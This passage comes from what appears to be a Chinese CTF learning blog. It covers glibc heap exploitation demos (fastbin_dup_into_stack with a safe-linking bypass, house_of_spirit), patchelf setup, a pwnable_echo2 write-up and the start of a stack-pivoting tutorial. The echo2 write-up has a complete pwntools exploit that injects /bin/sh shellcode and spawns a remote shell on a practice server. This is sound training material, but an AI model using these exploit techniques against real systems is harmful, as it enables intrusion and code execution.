class="line"></span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;2. 依次free a,b,a 的chunk，暴露double free漏洞\n&quot;);</span><br><span class="line">	free(a);</span><br><span class="line">	free(b);</span><br><span class="line">	free(a);</span><br><span class="line">	fprintf(stderr, &quot;现在fastbins链表为 [ %p, %p, %p ]。\n&quot;, a, b, a);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;3. 分配两个chunk\n&quot;);</span><br><span class="line">    unsigned long *d = calloc(1,8);</span><br><span class="line">	fprintf(stderr, &quot;第一次calloc(1,8): %p\n&quot;, d);</span><br><span class="line">	fprintf(stderr, &quot;第二次calloc(1,8): %p\n&quot;, calloc(1,8));</span><br><span class="line">	fprintf(stderr, &quot;现在fastbins链表为 [ %p ]。\n&quot;, a);</span><br><span class="line">	fprintf(stderr, &quot;现在，我们修改第一次malloc的%p，就会同时修改fastbins中的头部元素中fd的值\n&quot;, d);</span><br><span class="line">	fprintf(stderr, &quot;覆盖 %p 的内容——stack_var的地址，fastbins中头部元素的fd字段同时也会填入相同的内容。\n&quot;, d);</span><br><span class="line">	unsigned long ptr = (unsigned long)stack_var;</span><br><span class="line">	unsigned long addr = (unsigned long) d;</span><br><span class="line">	*d = (addr &gt;&gt; 12) ^ ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;第三次calloc(1,8): %p，将栈地址放入fastbins链表中\n&quot;, calloc(1,8));</span><br><span class="line"></span><br><span class="line">	void *p = calloc(1,8);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;第四次calloc(1,8): %p\n，发现这一次malloc的空间在栈上！\n&quot;, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>编译运行结果<br><img src="/images/p4/image-21.png"></p>
<h2 id="0-布置栈结构"><a href="#0-布置栈结构" class="headerlink" title="0. 布置栈结构"></a>0. 布置栈结构</h2><p>栈上创建一个数组，在第二个元素写入0x20</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned long stack_var[4] __attribute__ ((aligned (0x10)));</span><br><span class="line">stack_var[1] = 0x20;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>C语言内存对齐与attribute选项介绍<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0LzIxYXNwbmV0L2FydGljbGUvZGV0YWlscy82NzI5NzI0">https://blog.csdn.net/21aspnet/article/details/6729724<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>这样我们在栈上就有了这样的一块空间，fastbin_dup_into_stack想要将malloc的空间指向stack_var[2]。<br><img src="/images/p4/image-25.png"></p>
<h2 id="1-分配3个chunk"><a href="#1-分配3个chunk" class="headerlink" title="1. 分配3个chunk"></a>1. 分配3个chunk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int *a = calloc(1,8);</span><br><span class="line">int *b = calloc(1,8);</span><br><span class="line">int *c = calloc(1,8);</span><br></pre></td></tr></table></figure>
<p>画一下堆栈图<br><img src="/images/p4/image-34.png"></p>
<h2 id="2-依次free-a-b-a-的chunk"><a href="#2-依次free-a-b-a-的chunk" class="headerlink" title="2. 依次free a,b,a 的chunk"></a>2. 依次free a,b,a 的chunk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(a);</span><br><span class="line">free(b);</span><br><span class="line">free(a);</span><br></pre></td></tr></table></figure>
<p>看一下程序依次释放完chunk a,b,c后，堆结构和fastbins的情况<br><img src="/images/p4/image-22.png"></p>
<p>此时的堆栈图（fastbins通过fd指针找到下一个free chunk）<br><img src="/images/p4/image-45.png"></p>
<h2 id="3-分配两个chunk"><a href="#3-分配两个chunk" class="headerlink" title="3. 分配两个chunk"></a>3. 分配两个chunk</h2><p>分配两个chunk,将第一个malloc chunk 标记为d的chunk，第二个不用管</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned long *d = calloc(1,8);</span><br><span class="line">calloc(1,8)</span><br></pre></td></tr></table></figure>
<p>那么，fastbins中就剩下a的chunk了<br><img src="/images/p4/image-23.png"><br>此时的堆栈图<br><img src="/images/p4/image-40.png"></p>
<h2 id="ATTACK"><a href="#ATTACK" class="headerlink" title="ATTACK"></a>ATTACK</h2><p>此时，d分配到的chunk其实是之前a的chunk，<strong>而fastbins中我们的a还在的！所以当我们对d写入数据时，fastbins中的值也会被覆盖 （我们想要覆盖free chunk的fd指针）</strong></p>
<p>既然我们想要malloc到栈上stack_var[2]的地址，我们的第一个想法只要fastbins中free chunk 的fd指针指向stack_var[2]就可以了<br>但这样离成功还差一步，因为正常来讲fd指针指向的是chunk的开头，也就是prev size字段，而不是数据段开头，所以我们fd指针要指向stack_var[0]的地址，也就是stack_var<br>我们的栈空间被malloc得到的chunk预想应该是这样的<br><img src="/images/p4/image-42.png"></p>
<p><strong>向d中写入的data就是fastbins中a chunk的fd字段</strong>，所以现在覆盖前 8 字节，修改 fd 指针指向stack_var</p>
<blockquote>
<p>在glibc 2.32之前，我们只需要这样的代码，就可以修改d的data字段值为stack_var的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*d = stack_var;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>但是2.32更新了一个叫<span class="exturl" data-url="aHR0cHM6Ly9yZXNlYXJjaC5jaGVja3BvaW50LmNvbS8yMDIwL3NhZmUtbGlua2luZy1lbGltaW5hdGluZy1hLTIwLXllYXItb2xkLW1hbGxvYy1leHBsb2l0LXByaW1pdGl2ZQ==">“Safe-Linking”（安全链接）<i class="fa fa-external-link-alt"></i></span>的保护机制，<br>这篇博客的重点不在这里，现在只需要知道我们要通过下述代码写入d chunk data段的前八个字节，从而覆盖fd指针</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned long ptr = (unsigned long)stack_var;</span><br><span class="line">unsigned long addr = (unsigned long) d;</span><br><span class="line">*d = (addr &gt;&gt; 12) ^ ptr;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>这样一来，fastbins中的a chunk的fd指针就指向了stack_var<br><img src="/images/p4/image-44.png"></p>
<p><img src="/images/p4/image-50.png" alt="fastbins中多了一个栈空间上的元素"></p>
<p>我们把fastbins中的a分配出去，stack_var来到fastbins的头部，此时堆管理器认为fastbins中还有一个free chunk，而这个“chunk”其实在栈上<br><img src="/images/p4/image-46.png"><br><img src="/images/p4/image-51.png" alt="此时的fastbins"><br><img src="/images/p4/image-52.png" alt="看到chunk a和 chunk d是同一个chunk"></p>
<p>这时候为p变量 malloc一块空间，就会申请到fastbins指向的栈上的stack_var的一块0x20大小的空间<br><img src="/images/p4/image-53.png" alt="查看p变量的地址"><br><img src="/images/p4/image-54.png"><br>至此，我们攻击了堆，让malloc返回了一个指向栈上空间的指针</p>
<hr>
<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h1><p>演示 House of Spirit 攻击，该攻击通过将非堆地址加入 fastbins，导致任意地址写操作。</p>
<h2 id="house-of-spirit-c-源代码"><a href="#house-of-spirit-c-源代码" class="headerlink" title="house_of_spirit.c 源代码"></a>house_of_spirit.c 源代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	setbuf(stdout, NULL); // 禁用缓冲区，确保输出按顺序显示</span><br><span class="line"></span><br><span class="line">	//填满 tcache</span><br><span class="line">	void *chunks[7];</span><br><span class="line">	for (int i = 0; i &lt; 7; i++) &#123;</span><br><span class="line">		chunks[i] = malloc(0x30); </span><br><span class="line">	&#125;</span><br><span class="line">	for (int i = 0; i &lt; 7; i++) &#123;</span><br><span class="line">		free(chunks[i]); </span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	puts(&quot;1: 准备 fake chunk。&quot;);</span><br><span class="line">	long fake_chunks[10] __attribute__ ((aligned (0x10))); // 16 字节对齐</span><br><span class="line">	printf(&quot;fake chunk 的地址是 %p\n&quot;, fake_chunks);</span><br><span class="line">	printf(&quot;fake chunk 包含两个 chunk。第一个 chunk 的起始地址为 %p，第二个 chunk 的起始地址为 %p。\n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[9]);</span><br><span class="line">	printf(&quot;将第一个 fake chunk 的大小（%p）设置为 0x40，这样 malloc 会认为它是一个有效 chunk。\n&quot;, &amp;fake_chunks[1]);</span><br><span class="line">	fake_chunks[1] = 0x40; </span><br><span class="line"></span><br><span class="line">	printf(&quot;将下一个 fake chunk 的大小（%p）设置为 0x1234，这样free第一个 fake chunk 时可以通过检查。\n&quot;, &amp;fake_chunks[9]);</span><br><span class="line">	fake_chunks[9] = 0x1234; </span><br><span class="line"></span><br><span class="line">	puts(&quot;2: 释放第一个 fake chunk&quot;);</span><br><span class="line">	void *victim = &amp;fake_chunks[2];</span><br><span class="line">	free(victim); </span><br><span class="line"></span><br><span class="line">	puts(&quot;3: malloc fake chunk&quot;);</span><br><span class="line">	printf(&quot;接下来calloc 会返回我们的 fake chunk，地址为 %p！\n&quot;, &amp;fake_chunks[2]);</span><br><span class="line">	void *allocated = calloc(1, 0x30);</span><br><span class="line">	printf(&quot;malloc(0x30): %p, fake chunk: %p\n&quot;, allocated, victim);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>编译运行<br><img src="/images/p4/image-55.png"></p>
<h2 id="0-原理"><a href="#0-原理" class="headerlink" title="0. 原理"></a>0. 原理</h2><p>House Of Spirit将任意地址加入到 fastbins 中，从而malloc 到指定地址的 chunk。</p>
<p>House Of Spirit和 fastbin_dup 的区别是：</p>
<ul>
<li>fastbin_dup中free的chunk是程序自己malloc产生的，free时chunk就会进入fastbins链表中</li>
<li>house of spirit中free的chunk不是程序自己产生的，而是我们指定的一块内存空间”fake chunk”，free这个chunk让他进入fastbins</li>
</ul>
<p>一个chunk在被free之后归到fastbins之前会有一些检查，检查通过才会被加到fastbins中，所以我们要做一些努力，让程序相信这个fake chunk是合法的chunk：</p>
<ol>
<li>fake chunk 的 M 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
<li>fake chunk 地址内存对齐：32位0xXXXX0或0xXXXX4；64位0xXXXX0或0xXXXX8</li>
<li>fake chunk 的 size大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
<li>fake chunk 的 next chunk size不能小于 2 * SIZE_SZ，同时不能大于av-&gt;system_mem</li>
<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
</ol>
<h2 id="1-构造-fake-chunk"><a href="#1-构造-fake-chunk" class="headerlink" title="1. 构造 fake chunk"></a>1. 构造 fake chunk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">long fake_chunks[10] __attribute__ ((aligned (0x10))); // 16 字节对齐</span><br><span class="line">fake_chunks[1] = 0x40; </span><br><span class="line">fake_chunks[9] = 0x1234; </span><br></pre></td></tr></table></figure>
<p>在栈上准备我们的fake chunk<br><img src="/images/p4/image-57.png"></p>
<blockquote>
<p>对于fake chunk的M位，fake_chunks[1] &#x3D; 0x40; 就保证了AMP位均为0。<br>通过__attribute__保证了内存字节对齐<br>fake_chunks[9] &#x3D; 0x1234满足对next chunk 的检查</p>
</blockquote>
<h2 id="2-释放-fake-chunk"><a href="#2-释放-fake-chunk" class="headerlink" title="2. 释放 fake chunk"></a>2. 释放 fake chunk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void *victim = &amp;fake_chunks[2];</span><br><span class="line">free(victim);</span><br></pre></td></tr></table></figure>
<p>释放fake chunk，可以看到精心构造的fake chunk成功绕过了检查，进入了fastbins中<br><img src="/images/p4/image-58.png"></p>
<h2 id="3-malloc-fake-chunk"><a href="#3-malloc-fake-chunk" class="headerlink" title="3. malloc fake chunk"></a>3. malloc fake chunk</h2><p>既然fastbins中存在我们的fake chunk，那么malloc 适当大小的chunk时，我们就能获得这个chunk了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void *allocated = calloc(1, 0x30);</span><br></pre></td></tr></table></figure>

<p><img src="/images/p4/image-60.png"><br>allocated 分配到的内存地址就是victim的地址！</p>
]]></content>
      <categories>
        <category>pwn学习</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>堆利用</tag>
        <tag>how2heap</tag>
        <tag>fastbin_dup</tag>
        <tag>fastbin_dup_into_stack</tag>
        <tag>house_of_spirit</tag>
      </tags>
  </entry>
  <entry>
    <title>使用glibc-all-in-one和patchelf替换程序依赖的libc文件</title>
    <url>/posts/5849/</url>
    <content><![CDATA[<div class="markdown-body">

<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>在做堆题时，由于题目环境与本地环境的差异，直接运行题目文件会出现偏差或错误，可以通过glibc-all-in-one和patchelf工具找到与题目环境相同的libc和ld，重新动态链接文件，即可解决。</p>
<span id="more"></span>

<h1 id="1-glibc-all-in-one下载所需要的libc文件"><a href="#1-glibc-all-in-one下载所需要的libc文件" class="headerlink" title="1. glibc-all-in-one下载所需要的libc文件"></a>1. glibc-all-in-one下载所需要的libc文件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 克隆glibc-all-in-one 仓库</span><br><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one</span><br><span class="line">cd glibc-all-in-one</span><br><span class="line"></span><br><span class="line"># 更新最新版本的glibc</span><br><span class="line">sudo python3 update_list             #</span><br><span class="line"></span><br><span class="line"># 查看可下载的glibc</span><br><span class="line">cat list </span><br><span class="line"></span><br><span class="line"># 下载所需要的glibc     </span><br><span class="line"># 注意download 对应 list ；download_old 对应 list_old </span><br><span class="line">./download 2.23-0ubuntu3_amd64  #./download_old 2.21-0ubuntu4.3_amd64</span><br></pre></td></tr></table></figure>
<p>download之后就可以在glibc-all-in-one&#x2F;libs&#x2F;中可以看到下载的2.23-0ubuntu3_amd64，进入到文件夹中，关注这两个文件<br><img src="/images/p3/image-5.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ld 和 libc文件路径</span><br><span class="line">~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so</span><br><span class="line">~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so</span><br></pre></td></tr></table></figure>
<h1 id="2-patchelf-更改程序依赖的libc文件"><a href="#2-patchelf-更改程序依赖的libc文件" class="headerlink" title="2. patchelf 更改程序依赖的libc文件"></a>2. patchelf 更改程序依赖的libc文件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装 patchelf</span><br><span class="line">sudo apt -y install patchelf</span><br><span class="line"></span><br><span class="line"># 替换 ld 文件</span><br><span class="line">patchelf --set-interpreter &quot;ld文件路径&quot; &quot;程序路径&quot;</span><br><span class="line"></span><br><span class="line"># 替换 libc文件</span><br><span class="line">patchelf --replace-needed libc.so.6 &quot;libc文件路径&quot; &quot;程序路径&quot;</span><br><span class="line"></span><br><span class="line"># 查看程序的动态库依赖</span><br><span class="line">ldd &quot;程序路径&quot;</span><br></pre></td></tr></table></figure>


<p><img src="/images/p3/image-6.png" alt="a.out原本的动态库依赖"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># patchelf更改动态库依赖</span><br><span class="line">patchelf --set-interpreter ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so a.out</span><br><span class="line">patchelf --replace-needed libc.so.6 ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so a.out</span><br></pre></td></tr></table></figure>

<p><img src="/images/p3/image-7.png" alt="a.out替换libc文件后的动态库依赖"></p>
</div>]]></content>
      <categories>
        <category>pwn学习</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>glibc-all-in-one</tag>
        <tag>patchelf</tag>
        <tag>动态依赖库</tag>
      </tags>
  </entry>
  <entry>
    <title>【buuCTF刷题】pwnable-echo2</title>
    <url>/posts/9ef5/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>第一次做堆——UAF 的题，感觉堆对代码能力的要求更高，并且IDA分析出来的也要辩证的去看，比如函数指针数组，他可能会分析成这样，我们就要知道func[0] &#x3D;echo1;func[1] &#x3D;echo2;func[2] &#x3D;echo3<br><img src="/./images/p5/1.png"><br>注意64位程序格式化字符串漏洞中：<br>    %0$p &lt;=&#x3D;&gt; rdi &lt;=&#x3D;&gt; printf的第一个参数<br>    %1$p &lt;=&#x3D;&gt; rsi &lt;=&#x3D;&gt; printf的第二个参数</p>
<span id="more"></span>

<h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><blockquote>
<p>题目链接：<span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI3B3bmFibGVfZWNobzI=">https://buuoj.cn/challenges#pwnable_echo2<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>Checksec，64位，保护全关<br><img src="/./images/p5/2.png"><br>IDA分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; // rax</span><br><span class="line">  unsigned int i; // [rsp+Ch] [rbp-24h] BYREF</span><br><span class="line">  __int64 v6[4]; // [rsp+10h] [rbp-20h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line">  o = malloc(0x28uLL);</span><br><span class="line">  *(o + 3) = greetings;</span><br><span class="line">  *(o + 4) = byebye;</span><br><span class="line">  printf(&quot;hey, what&#x27;s your name? : &quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%24s&quot;, v6);</span><br><span class="line">  v3 = o;</span><br><span class="line">  *o = v6[0];</span><br><span class="line">  v3[1] = v6[1];</span><br><span class="line">  v3[2] = v6[2];</span><br><span class="line">  id = v6[0];</span><br><span class="line">  getchar();</span><br><span class="line">  func[0] = echo1;</span><br><span class="line">  qword_602088 = echo2;</span><br><span class="line">  qword_602090 = echo3;</span><br><span class="line">  for ( i = 0; i != &#x27;y&#x27;; i = getchar() )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;\n- select echo type -&quot;);</span><br><span class="line">        puts(&quot;- 1. : BOF echo&quot;);</span><br><span class="line">        puts(&quot;- 2. : FSB echo&quot;);</span><br><span class="line">        puts(&quot;- 3. : UAF echo&quot;);</span><br><span class="line">        puts(&quot;- 4. : exit&quot;);</span><br><span class="line">        printf(&quot;&gt; &quot;);</span><br><span class="line">        __isoc99_scanf(&quot;%d&quot;, &amp;i);</span><br><span class="line">        getchar();</span><br><span class="line">        if ( i &gt; 3 )</span><br><span class="line">          break;</span><br><span class="line">        (func[i - 1])();</span><br><span class="line">      &#125;</span><br><span class="line">      if ( i == 4 )</span><br><span class="line">        break;</span><br><span class="line">      puts(&quot;invalid menu&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    cleanup();</span><br><span class="line">    printf(&quot;Are you sure you want to exit? (y/n)&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;bye&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序分两段看，进入for循环前进行一系列内存空间布局，程序的内存空间是这样的<br><img src="/./images/p5/3.png"><br>__isoc99_scanf(“%24s”, v6);会覆盖到o,o+1和o+2的位置<br>进入for循环，让我们选择三种漏洞利用方式：BOF(echo1) , FSB(echo2)和UAF(echo3)，分别看一下这三个函数</p>
<ol>
<li>echo1 废物一个<br><img src="/./images/p5/4.png"></li>
<li>echo2 是一个简单的格式化字符串漏洞，format在栈上，可以泄露rbp地址<br><img src="/./images/p5/5.png"></li>
<li>echo3 给变量s分配一个0x20的大小，然后输出我们输入的内容，最后free掉s的chunk，注意free之后没有将指针置零，所以可能存在UAF漏洞<br><img src="/./images/p5/6.png"><br>继续往下看，注意这里<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  if ( i == 4 )</span><br><span class="line">    break;</span><br><span class="line">  puts(&quot;invalid menu&quot;);</span><br><span class="line">&#125;</span><br><span class="line">cleanup();</span><br><span class="line">printf(&quot;Are you sure you want to exit? (y/n)&quot;);</span><br></pre></td></tr></table></figure>
当我们选择”- 4. : exit”时，他会询问我们一次”Are you sure you want to exit? (y&#x2F;n)”，我们再输入”y”时，程序才会真的退出，如果输入”n”，程序还是回到循环中继续选择。<strong>但是无论怎么样，都执行了cleanup()函数，而cleanup()是将最开始的那个o指针free掉了。</strong><br><img src="/./images/p5/7.png"><br>如果我们只是骗一下程序假装要退出，让他执行cleanup，然后输入n，会发生什么呢，首先free掉的chunk会被fastbins链起来<br><img src="/./images/p5/8.png"><br>输入n，再次进入循环，该选择哪个漏洞函数呢？当然是echo3<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 echo3()</span><br><span class="line">&#123;</span><br><span class="line">  char *s; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  (*(o + 3))(o);</span><br><span class="line">  s = malloc(0x20uLL);</span><br><span class="line">  get_input(s, 0x20);</span><br><span class="line">  puts(s);</span><br><span class="line">  free(s);</span><br><span class="line">  (*(o + 4))(o);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
因为echo3 malloc的大小是0x20，我们fastbins中的chunk大小是0x28，所以echo3中的s分配到的内存就是o的chunk<br><img src="/./images/p5/9.png"><br>我们最多向这个chunk写入0x20的字节，也就是o,o+1,o+2,o+3。在被free掉之后，我们写入的内容依然存在，在fastbins中的地址也没有发生变化<br><strong>这就够了，将o+3——也就是greetings()覆盖为shellcode的地址，再次进入echo3时，就会执行shellcode</strong><br>那么shellcode从哪来呢？<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;hey, what&#x27;s your name? : &quot;);</span><br><span class="line">__isoc99_scanf(&quot;%24s&quot;, v6);</span><br></pre></td></tr></table></figure>
忘掉他了吗？我们往栈上的v6（写入小于24字节的shellcode，然后用echo2中的格式化字符串漏洞泄露rbp地址，然后rbp-0x20就可以啦，参数偏移量10（因为是64位程序，要算上6个寄存器）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io.sendlineafter(&#x27;&gt; &#x27;,b&#x27;2&#x27;)</span><br><span class="line">io.sendline(b&#x27;%10$pAAAA&#x27;)</span><br><span class="line">rbp = int(io.recvuntil(&#x27;AAAA&#x27;,drop=True),16)</span><br><span class="line">shellcode_addr = rbp - 0x20</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">x64_32 = 1</span><br><span class="line">if x64_32:</span><br><span class="line">        context(os = &#x27;linux&#x27;,log_level = &quot;debug&quot;,arch = &#x27;amd64&#x27;)</span><br><span class="line">else:</span><br><span class="line">        context(os = &#x27;linux&#x27;,log_level = &quot;debug&quot;,arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">s       = lambda data               :io.send(data)</span><br><span class="line">sa      = lambda delim,data         :io.sendafter(str(delim), data)</span><br><span class="line">sl      = lambda data               :io.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :io.sendlineafter(str(delim), data)</span><br><span class="line">r       = lambda num                :io.recv(num)</span><br><span class="line">ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)</span><br><span class="line">rl      = lambda                    :io.recvline()</span><br><span class="line">itr     = lambda                    :io.interactive()</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">leak    = lambda name,addr          :log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">l64     = lambda      :u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))</span><br><span class="line">l32     = lambda      :u32(io.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">######################################################################################################</span><br><span class="line">#io = process(&#x27;./echo2&#x27;)</span><br><span class="line">io = remote(&#x27;node5.buuoj.cn&#x27;,27765)</span><br><span class="line"></span><br><span class="line">shellcode = b&#x27;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&#x27;</span><br><span class="line">sla(&#x27;name? : &#x27;,shellcode)</span><br><span class="line"></span><br><span class="line">sla(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">sl(&#x27;%10$pAAAA&#x27;)</span><br><span class="line">ru(b&#x27;0x&#x27;)</span><br><span class="line">rbp_addr = int(ru(b&#x27;AAAA&#x27;),16)</span><br><span class="line">shellcode_addr = rbp_addr - 0x20</span><br><span class="line">leak(&#x27;shellcode_addr-----&gt;&#x27;, shellcode_addr)</span><br><span class="line"></span><br><span class="line">sla(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br><span class="line">sla(&#x27;(y/n)&#x27;,&#x27;n&#x27;)</span><br><span class="line">sla(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">sla(&#x27;\n&#x27;,b&#x27;a&#x27;*24 + p64(shellcode_addr))</span><br><span class="line">sla(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>buuCTF刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>fmt</tag>
        <tag>UAF</tag>
        <tag>pwnable_echo2</tag>
      </tags>
  </entry>
  <entry>
    <title>栈迁移学习总结</title>
    <url>/posts/6e43/</url>
    <content><![CDATA[<h1 id="前置知识：什么是栈迁移？"><a href="#前置知识：什么是栈迁移？" class="headerlink" title="前置知识：什么是栈迁移？"></a>前置知识：什么是栈迁移？</h1><blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9mYW5jeS1yb3AvI3N0YWNrLXBpdm90aW5n">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-pivoting<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>首先看一下正常的程序结构，函数在结束时会进行leave和ret指令<br>——leave做两件事，第一件事是mov esp,ebp，也就是将esp移到ebp的位置，第二件事是pop ebp，也就是将ebp移到上一个函数的记录的位置上去<br>——ret就做一件事pop eip，也就是将esp中的内容弹入eip中，也就是内容放到程序的执行流上。</p>
<span id="more"></span>

<p><img src="/images/p1/s1.png"><br>在栈迁移中，很多情况下我们需要在栈上的返回地址覆盖为leave_ret的gadget上（这里的0xcffc），让程序执行两次leave_ret，那连续的两个leave_ret后栈会发生什么变化呢？<br>回到初始状态，假设我们的栈可以溢出到返回地址，我们将ebp覆盖为esp的地址（0xcfd0），返回地址覆盖为一个leave_ret的gadget，观察下面的图<br><img src="/images/p1/s2.png"><br>可以看到，栈在经历过两次leave_ret后，程序的执行流又回到了我们的栈空间，那如果我们在写入数据的时候，从0xcfd4的位置开始写入我们的system函数的地址，那就可以把system函数放到程序的执行流，从而执行我们的system(‘&#x2F;bin&#x2F;sh’)<br>通过两道例题实践栈迁移</p>
<hr>
<h1 id="例1：ciscn-2019-es-2"><a href="#例1：ciscn-2019-es-2" class="headerlink" title="例1：ciscn_2019_es_2"></a>例1：ciscn_2019_es_2</h1><blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2Npc2NuXzIwMTlfZXNfMg==">https://buuoj.cn/challenges#ciscn_2019_es_2<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>checksec;file：32位，开启NX保护<br><img src="/images/p1/s3.png"></p>
<p>IDA里面分析，栈溢出发生在vul函数，但是只可以溢出0x8的字节，这只能够覆盖ebp_main和返回地址，而想再向栈上像ret2text那样写入system和binsh显然不可行<br><img src="/images/p1/s4.png"></p>
<p>这个时候就要考虑栈迁移了<br>程序存在system函数，但没有binsh字符串，我们需要向某个地址写入binsh<br><img src="/images/p1/s5.png"></p>
<p>那向哪个位置写入我们的binsh呢？其实就可以写到这个栈中，只要拿到了ebp的地址，就可以通过偏移拿到栈上任意内容的地址。<br>那ebp的地址怎么拿到呢？我们知道read函数结束时会自动加‘\x00’作为字符串的截断，然后输出时遇到’\x00’停止输出，如果我们在第一次read的时候给他填满0x30个字符，那么read就没地方给他补上’\x00’了，那么输出的时候打印完0x30个字符，就会继续打印出ebp的地址了。<br>第一次read拿到ebp的地址后，第二次read就要控制程序的执行流了<br>根据前置知识布置一下栈结构<br><img src="/images/p1/s6.png"></p>
<p>gdb调试看一下read后的栈结构，偏移为0x28(&#x3D;0xf8-0xd0)，同时这个0x28也是我们写入的字符串距离ebp的位置<br><img src="/images/p1/s7.png"></p>
